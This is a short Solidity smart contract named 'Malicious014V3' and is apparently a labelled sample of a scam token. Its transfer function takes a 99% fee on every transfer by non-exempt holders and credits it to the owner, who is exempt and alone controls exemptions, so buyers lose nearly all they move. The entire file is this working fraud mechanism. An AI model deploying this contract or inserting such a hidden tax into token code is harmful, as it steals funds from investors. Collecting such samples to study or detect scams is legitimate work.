// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Malicious014V3 {
    address public owner;
    uint256 public taxBps = 9900;
    mapping(address => bool) public exempt;
    mapping(address => uint256) public balanceOf;

    constructor(uint256 supply) {
        owner = msg.sender;
        exempt[msg.sender] = true;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function setExempt(address user, bool value) external onlyOwner { exempt[user] = value; }

    function transfer(address to, uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "balance");
        uint256 fee = exempt[msg.sender] ? 0 : amount * taxBps / 10000;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount - fee;
        balanceOf[owner] += fee;
    }
}
